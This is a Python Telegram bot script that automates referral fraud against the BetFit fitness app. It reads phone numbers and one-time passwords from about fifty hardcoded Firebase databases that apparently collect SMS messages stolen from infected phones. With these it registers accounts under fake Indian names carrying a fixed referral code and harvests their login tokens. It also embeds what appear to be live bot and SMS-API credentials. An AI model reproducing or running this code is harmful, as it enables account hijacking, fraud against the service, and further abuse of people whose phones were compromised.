import os
import re
import sys
import json
import time
import base64
import random
import threading
import urllib.parse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

try:
    from faker import Faker
    fake = Faker('en_IN')
except ImportError:
    print("❌ 'faker' library missing. Install: pip install faker")
    sys.exit(1)

# ============================================================================
#  ██  CONFIG & TELEGRAM SETTINGS  ██
# ============================================================================

TELEGRAM_BOT_TOKEN = "8692806613:AAH1UFtLjWMpg48UKVi325MHAga4_SctNHY"      
AUTHORIZED_USER_ID = 8645142724                  # Apni Telegram Numeric ID

BASE_URL     = "https://api.betfit.in"
MSG91_BASE   = "https://control.msg91.com/api/v5/widget"

WIDGET_ID    = "356671646c71373831333038"
TOKEN_AUTH   = "454703TqlUQcFV6850eba4P1"

REFERRAL_CODE = "978702DC"
COUNTRY       = "india"
DEVICE_ID     = "V417IR"
GENDER        = "Male"

HEIGHT_FEET      = "5"
HEIGHT_INCH      = "2"
WEIGHT           = "52"
FITNESS_LEVEL    = "Intermediate"
FITNESS_PREF     = "Running"
TIME_FOR_FITNESS = "30-60 min"

MAX_RETRIES       = 3
RETRY_DELAY       = 5
REQUEST_TIMEOUT   = 60

OTP_WAIT_TIMEOUT  = 30      
OTP_POLL_INTERVAL = 1       
OTP_SEND_DELAY    = 8       
SUCCESS_COOLDOWN  = 30      
PANEL_WORKERS     = 1       

PANELS_FILE       = "panels.json"
OUTPUT_FILE       = "betfit_tokens.txt"
USED_NUMBERS_FILE = "used_numbers.txt"

IP_BLOCKED = False
_file_lock = threading.Lock()
_last_otp_send_time = 0.0

FIRST_NAMES = ["Rahul","Priya","Amit","Sneha","Vikas","Neha","Rohit","Anjali",
               "Suresh","Kavita","Arjun","Pooja","Manish","Divya","Sandeep","Ritu",
               "Karan","Shreya","Nikhil","Meera","Ravi","Ananya","Harsh","Swati",
               "Deepak","Ruchi","Siddharth","Tanvi"]

SURNAMES = ["Sharma","Verma","Kumar","Gupta","Singh","Patel","Yadav","Mishra",
            "Reddy","Joshi","Nair","Desai","Tiwari","Kapoor","Rao","Bansal",
            "Mehta","Iyer","Chauhan","Pillai","Kulkarni","Bose","Vardhan","Jain",
            "Malhotra","Agarwal","Menon","Shah"]

def random_first_name(): return random.choice(FIRST_NAMES)
def random_last_name():  return random.choice(SURNAMES)

def random_dob():
    start = datetime(1990, 1, 1)
    end   = datetime(1999, 12, 31)
    return fake.date_between(start_date=start, end_date=end).strftime("%Y-%m-%d")

def api_headers(bearer_token=None):
    h = {
        "user-agent": "Dart/3.8 (dart:io)",
        "content-type": "application/json",
        "accept-encoding": "gzip",
        "host": "api.betfit.in",
    }
    if bearer_token:
        h["authorization"] = f"Bearer {bearer_token}"
    return h

def safe_request(method, url, **kwargs):
    kwargs.setdefault("timeout", REQUEST_TIMEOUT)
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            if method.upper() == "GET": return requests.get(url, **kwargs)
            elif method.upper() == "POST": return requests.post(url, **kwargs)
            elif method.upper() == "PUT": return requests.put(url, **kwargs)
            return requests.request(method, url, **kwargs)
        except Exception:
            if attempt < MAX_RETRIES: time.sleep(RETRY_DELAY)
    return None

def load_used_numbers():
    if not os.path.exists(USED_NUMBERS_FILE): return set()
    try:
        with open(USED_NUMBERS_FILE) as f:
            return {line.strip() for line in f if line.strip() and line.strip().isdigit()}
    except Exception:
        return set()

def append_used_number(mobile_number):
    with _file_lock:
        try:
            with open(USED_NUMBERS_FILE, "a") as f:
                f.write(f"{mobile_number}\n")
                f.flush()
        except Exception:
            pass

def load_panels():
    # Saare Firebase panels ab direct yahan set kar diye gaye hain
    return [
        "https://sanjay-16691-default-rtdb.firebaseio.com",
        "https://jamesbondd5-default-rtdb.firebaseio.com",
        "https://admin-39ss-default-rtdb.firebaseio.com",
        "https://raja-singh-admin-default-rtdb.firebaseio.com",
        "https://anup-1413-default-rtdb.firebaseio.com",
        "https://rambhai-2c356-default-rtdb.firebaseio.com",
        "https://birend-b39e9-default-rtdb.firebaseio.com",
        "https://dhiko0909-default-rtdb.firebaseio.com",
        "https://kichudjdudh-default-rtdb.firebaseio.com",
        "https://sunil-da-default-rtdb.firebaseio.com",
        "https://sumit1-82dcd-default-rtdb.firebaseio.com",
        "https://nimayo-589a8-default-rtdb.firebaseio.com",
        "https://kammarene-default-rtdb.firebaseio.com",
        "https://jdjfjiiii-default-rtdb.firebaseio.com",
        "https://adpanel37-default-rtdb.firebaseio.com",
        "https://whithex-741e0-default-rtdb.firebaseio.com",
        "https://sarita-setup-default-rtdb.firebaseio.com",
        "https://rantuwnzusjsjsndhej6sb-default-rtdb.firebaseio.com",
        "https://my-penel-maxjoker98-default-rtdb.firebaseio.com",
        "https://suman0h55-default-rtdb.firebaseio.com",
        "https://kkdkumar-4e971-default-rtdb.firebaseio.com",
        "https://rojam-ff090-default-rtdb.firebaseio.com",
        "https://worokahre-default-rtdb.firebaseio.com",
        "https://uffuuf-d1a3c-default-rtdb.firebaseio.com",
        "https://thomas-maderchod-default-rtdb.firebaseio.com",
        "https://naina-singh-default-rtdb.firebaseio.com",
        "https://maxjoker98-2cdfe-default-rtdb.firebaseio.com",
        "https://barik-a53e5-default-rtdb.firebaseio.com",
        "https://rto8-7f24f-default-rtdb.firebaseio.com",
        "https://raj-panel-3e09a-default-rtdb.firebaseio.com",
        "https://rikiad-d2c69-default-rtdb.firebaseio.com",
        "https://fatmaadminpanel-default-rtdb.firebaseio.com",
        "https://amit-ka-71-default-rtdb.firebaseio.com",
        "https://blrm-c65dd-default-rtdb.firebaseio.com",
        "https://axis-c4bd3-default-rtdb.firebaseio.com",
        "https://hshshhs-51f68-default-rtdb.firebaseio.com",
        "https://dabu-a08f4-default-rtdb.firebaseio.com",
        "https://mrrrrrrrr-8a5c1-default-rtdb.firebaseio.com",
        "https://bali-7acc3-default-rtdb.firebaseio.com",
        "https://lol-3e5e7-default-rtdb.firebaseio.com",
        "https://nitish232626-default-rtdb.firebaseio.com",
        "https://jnzbczbkjgzkg-default-rtdb.firebaseio.com",
        "https://bablu-boss-default-rtdb.firebaseio.com",
        "https://sanjana-admin-panel-default-rtdb.firebaseio.com",
        "https://rtoadmin-49319-default-rtdb.firebaseio.com",
        "https://testing-848ad-default-rtdb.firebaseio.com",
        "https://rajvip-default-rtdb.firebaseio.com",
        "https://emesh-94556-default-rtdb.firebaseio.com",
        "https://rosni-9bb5c-default-rtdb.firebaseio.com",
        "https://android-bhai-6b609-default-rtdb.firebaseio.com",
        "https://premmiiii-default-rtdb.firebaseio.com",
        "https://gautam-febce-default-rtdb.firebaseio.com",
        "https://pornllllll-default-rtdb.firebaseio.com",
        "https://rto-office-e1c0c-default-rtdb.firebaseio.com",
        "https://alok5u2-default-rtdb.firebaseio.com"
    ]

def parse_panel_link(link):
    if not link: return None
    link = link.strip()
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        if not link.endswith("/"): link += "/"
        return link
    parsed_url = urllib.parse.urlparse(link)
    qs = urllib.parse.parse_qs(parsed_url.query)
    if "s" not in qs: return None
    s_param = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
    try:
        decoded = base64.b64decode(s_param).decode("utf-8").split("|")[0].strip()
        if not decoded.endswith("/"): decoded += "/"
        return decoded
    except Exception:
        return None

PHONE_PATTERNS = [
    re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
    re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE),
    re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"),
]

def extract_phones_and_clients(firebase_url):
    try:
        c_resp = requests.get(firebase_url + "clients.json", timeout=15, verify=False)
        clients_data = c_resp.json()
        if not isinstance(clients_data, dict): clients_data = {}
    except Exception:
        return []

    online_devices = [c_id for c_id, c_data in clients_data.items() if isinstance(c_data, dict) and c_data.get("status")]
    if not online_devices: return []

    result, seen = [], set()
    session = requests.Session()
    session.verify = False

    def fetch_device_number(c_id):
        try:
            m_req = session.get(f'{firebase_url}messages/{c_id}.json?orderBy="$key"&limitToLast=5', timeout=4)
            device_messages = m_req.json()
            if not isinstance(device_messages, dict): device_messages = {}
            counts = Counter()
            for msg in device_messages.values():
                if not isinstance(msg, dict): continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                for pat in PHONE_PATTERNS:
                    for num in pat.findall(text): counts[num] += 1
            if counts: return {"client_id": c_id, "phone": counts.most_common(1)[0][0]}
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(fetch_device_number, c_id) for c_id in online_devices]
        for future in as_completed(futures):
            res = future.result()
            if res and res["phone"] not in seen:
                seen.add(res["phone"])
                result.append(res)
    return result

def get_messages_snapshot(firebase_url, device_id, limit=15):
    try:
        url = f'{firebase_url}messages/{device_id}.json?orderBy="$key"&limitToLast={limit}'
        resp = requests.get(url, timeout=4, verify=False)
        data = resp.json()
        if isinstance(data, dict): return data
    except Exception:
        pass
    return {}

def get_last_message_key(firebase_url, device_id):
    msgs = get_messages_snapshot(firebase_url, device_id, limit=1)
    if msgs: return sorted(msgs.keys(), reverse=True)[0]
    return None

def send_otp(mobile_number):
    global IP_BLOCKED, _last_otp_send_time
    if IP_BLOCKED: return None, None

    with _file_lock:
        now = time.time()
        wait = OTP_SEND_DELAY - (now - _last_otp_send_time)
        if wait > 0: time.sleep(wait)
        _last_otp_send_time = time.time()

    url = f"{MSG91_BASE}/sendOtpMobile"
    payload = {"widgetId": WIDGET_ID, "tokenAuth": TOKEN_AUTH, "identifier": f"91{mobile_number}"}
    r = safe_request("POST", url, json=payload, headers={"content-type": "application/json; charset=UTF-8"})
    if not r or r.status_code != 200: return None, None

    try:
        data = r.json()
        req_id = data.get("message") or data.get("reqId")
        if isinstance(req_id, str) and req_id.strip().lower() in ("ipblocked", "blocked"):
            IP_BLOCKED = True
            return None, None
        if not req_id or req_id == "success" or not isinstance(req_id, str) or len(req_id) < 10:
            return None, None
        return req_id, int(time.time() * 1000)
    except Exception:
        return None, None

def fetch_otp_from_device(firebase_url, device_id, last_key_before_send):
    deadline = time.time() + OTP_WAIT_TIMEOUT
    otp_pattern = re.compile(r"(\d{4,6})")

    while time.time() < deadline:
        msgs = get_messages_snapshot(firebase_url, device_id, limit=15)
        if msgs:
            for msg_key in sorted(msgs.keys(), reverse=True):
                if last_key_before_send and msg_key <= last_key_before_send: continue
                msg = msgs[msg_key]
                if not isinstance(msg, dict): continue
                body = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                m = otp_pattern.search(body)
                if m: return m.group(1)
        time.sleep(OTP_POLL_INTERVAL)
    return None

def verify_otp(req_id, otp):
    url = f"{MSG91_BASE}/verifyOtp"
    payload = {"widgetId": WIDGET_ID, "tokenAuth": TOKEN_AUTH, "reqId": req_id, "otp": str(otp)}
    r = safe_request("POST", url, json=payload, headers={"content-type": "application/json; charset=UTF-8"})
    if not r: return None
    try:
        data = r.json()
        if data.get("type") == "success": return data["message"]
    except Exception:
        pass
    return None

def betfit_login(mobile_number, msg91_access_token):
    url = f"{BASE_URL}/api/auth/verifyMobileOTPV2"
    payload = {"phonenumber": mobile_number, "accessToken": msg91_access_token, "deviceToken": f"fcm_dummy_{mobile_number}", "deviceId": DEVICE_ID}
    r = safe_request("POST", url, json=payload, headers=api_headers())
    if not r: return None, None

    try:
        data = r.json()
        if not (data.get("status") and data.get("data", {}).get("token")): return None, None
        inner = data.get("data", {})
        token = inner["token"]

        is_new_flag = inner.get("isNewUser")
        profile_done = inner.get("profileCompleted")
        first_name = (inner.get("user") or {}).get("firstName") or inner.get("firstName")

        if is_new_flag is False or profile_done is True or (first_name and str(first_name).strip()):
            return "old", None
        return "new", token
    except Exception:
        return None, None

def is_new_user(fresh_token):
    r = safe_request("GET", f"{BASE_URL}/api/user-profile", headers=api_headers(fresh_token))
    if not r or r.status_code != 200: return True
    try:
        fname = r.json().get("data", {}).get("firstName")
        if fname and str(fname).strip(): return False
        return True
    except Exception:
        return True

def store_token(bearer_token, mobile_number):
    url = f"{BASE_URL}/api/auth/store-token"
    payload = {"devicetoken": f"fcm_dummy_{mobile_number}"}
    r = safe_request("POST", url, json=payload, headers=api_headers(bearer_token))
    return r.status_code if r else 0

def _blank_profile():
    return {k: None for k in [
        "firstName","lastName","userName","timeZone","gender",
        "heightFeet","heightInch","weight","birthday",
        "reasonOfLoseWeight","favouriteFood","favouriteHealtFood",
        "preferredMethodOfExercise","approachOfWeightLoss","weightGoal",
        "profile_description","pushnotifications","displayweight",
        "displaystepcount","recieveEmails","initialweight",
        "fitnessLevel","fitnessPreference","timeForFitness",
        "referralby","country","insta_handle","address"
    ]}

def put_profile(bearer_token, updates):
    payload = _blank_profile()
    payload.update(updates)
    r = safe_request("PUT", f"{BASE_URL}/api/user-profile", json=payload, headers=api_headers(bearer_token))
    return r.status_code if r else 0

def update_profile_full(bearer_token, first_name, last_name, dob):
    steps = [
        ({"firstName": first_name, "lastName": last_name, "gender": GENDER, "birthday": dob, "referralby": REFERRAL_CODE, "country": COUNTRY}),
        ({"heightFeet": HEIGHT_FEET, "heightInch": HEIGHT_INCH, "weight": WEIGHT}),
        ({"fitnessLevel": FITNESS_LEVEL}),
        ({"fitnessPreference": FITNESS_PREF}),
        ({"timeForFitness": TIME_FOR_FITNESS}),
    ]
    for upd in steps:
        put_profile(bearer_token, upd)
        time.sleep(0.4)

def post_login_calls(bearer_token):
    gets = [
        "/api/game/explore-bootstrap","/api/game/explore-challenges",
        "/api/game/explore-engagement","/api/game/explore-notifications",
        "/api/game/randomUploadCoupons","/api/game/force-update",
        "/api/game/game-targetAchieved","/api/auth/getWelcomepopup",
        "/api/game/my-games?page=1&limit=8&section=joined",
    ]
    for path in gets:
        safe_request("GET", BASE_URL + path, headers=api_headers(bearer_token))
        time.sleep(0.2)
    safe_request("POST", f"{BASE_URL}/api/add-userStepCount", json={"deviceId": DEVICE_ID, "userId": "", "deviceType": "Android", "stepsData": [], "redeemedFitPoint": False}, headers=api_headers(bearer_token))

def process_one_user(dev, firebase_url, stats, used_numbers):
    global IP_BLOCKED
    if IP_BLOCKED: return None

    mobile_number = dev["phone"]
    device_id = dev["client_id"]

    if mobile_number in used_numbers:
        stats["already_used_skip"] += 1
        return None

    last_key = get_last_message_key(firebase_url, device_id)
    req_id, _ = send_otp(mobile_number)
    if not req_id:
        if IP_BLOCKED: stats["ip_blocked_skipped"] += 1
        else: stats["otp_send_fail"] += 1
        return None

    otp = fetch_otp_from_device(firebase_url, device_id, last_key)
    if not otp:
        stats["otp_timeout"] += 1
        return None

    msg91_token = verify_otp(req_id, otp)
    if not msg91_token:
        stats["otp_verify_fail"] += 1
        return None

    login_status, fresh_token = betfit_login(mobile_number, msg91_token)
    if login_status is None:
        stats["login_fail"] += 1
        return None

    if login_status == "old" or not is_new_user(fresh_token):
        stats["already_registered"] += 1
        append_used_number(mobile_number)
        used_numbers.add(mobile_number)
        return None

    store_token(fresh_token, mobile_number)
    first_name, last_name, dob = random_first_name(), random_last_name(), random_dob()
    update_profile_full(fresh_token, first_name, last_name, dob)
    post_login_calls(fresh_token)

    stats["success"] += 1
    append_used_number(mobile_number)
    used_numbers.add(mobile_number)
    time.sleep(SUCCESS_COOLDOWN)

    return {"mobile": mobile_number, "device_id": device_id, "first_name": first_name, "last_name": last_name, "token": fresh_token}

def run_automation_script():
    global IP_BLOCKED
    IP_BLOCKED = False
    panels = load_panels()
    if not panels: return "❌ No panels found!"

    used_numbers = load_used_numbers()
    stats = {"success": 0, "already_registered": 0, "already_used_skip": 0, "otp_send_fail": 0, "otp_timeout": 0, "otp_verify_fail": 0, "login_fail": 0, "exceptions": 0, "ip_blocked_skipped": 0}
    all_users = []

    for link in panels:
        if IP_BLOCKED: break
        fb_url = parse_panel_link(link)
        if not fb_url: continue
        devices = extract_phones_and_clients(fb_url)
        if not devices: continue

        with ThreadPoolExecutor(max_workers=PANEL_WORKERS) as executor:
            futures = [executor.submit(process_one_user, dev, fb_url, stats, used_numbers) for dev in devices]
            for future in as_completed(futures):
                try:
                    res = future.result()
                    if res: all_users.append(res)
                except Exception:
                    pass

    if all_users:
        with open(OUTPUT_FILE, "w") as f:
            f.write("mobile|device_id|first_name|last_name|dob|gender|token\n")
            for u in all_users:
                f.write(f"{u['mobile']}|{u['device_id']}|{u['first_name']}|{u['last_name']}|{u['dob']}|{GENDER}|{u['token']}\n")

    return (
        f"📊 **Automation Finished!**\n\n"
        f"✅ Success: {stats['success']}\n"
        f"♻️ Already Registered: {stats['already_registered']}\n"
        f"⏩ Already Used Skip: {stats['already_used_skip']}\n"
        f"❌ OTP/Login Fails: {stats['otp_send_fail'] + stats['otp_timeout'] + stats['otp_verify_fail'] + stats['login_fail']}\n"
        f"🚫 IP Blocked: {stats['ip_blocked_skipped']}\n"
    )

# ============================================================================
#  ██  FLASK WEB SERVER  ██
# ============================================================================

app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "Bot is alive and running!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app_flask.run(host="0.0.0.0", port=port)

# ============================================================================
#  ██  TELEGRAM BOT COMMAND HANDLERS  ██
# ============================================================================

is_running = False

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID: return
    await update.message.reply_text(
        "⚡ **BetFit Automation Bot**\n\n"
        "🚀 `/run` - Automation start karo\n"
        "📊 `/status` - Check karo script chal rahi hai ya nahi\n"
        "📥 `/file` - Generated tokens file download karo"
    )

async def run_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_running
    if update.effective_user.id != AUTHORIZED_USER_ID: return
    
    if is_running:
        await update.message.reply_text("⚠️ Script already background me chal rahi hai!")
        return

    await update.message.reply_text("🚀 BetFit automation background me shuru ho gayi hai...")
    
    def background_task():
        global is_running
        is_running = True
        try:
            result_msg = run_automation_script()
        except Exception as e:
            result_msg = f"❌ Error: {str(e)}"
        is_running = False
        
        import asyncio
        async def send_msg():
            bot = context.bot
            await bot.send_message(chat_id=update.effective_chat.id, text=result_msg)
        asyncio.run(send_msg())

    threading.Thread(target=background_task).start()

async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID: return
    if is_running:
        await update.message.reply_text("🟢 Script abhi background me active hai aur kaam kar rahi hai.")
    else:
        await update.message.reply_text("🔴 Script currently idle hai.")

async def file_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID: return
    if os.path.exists(OUTPUT_FILE):
        await update.message.reply_document(document=open(OUTPUT_FILE, "rb"), caption="📁 Yeh lo aapke generated tokens!")
    else:
        await update.message.reply_text("❌ Abhi tak koi `betfit_tokens.txt` file generate nahi hui hai.")

def main():
    threading.Thread(target=run_flask, daemon=True).start()
    
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("run", run_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("file", file_cmd))
    
    app.run_polling()

if __name__ == "__main__":
    main()
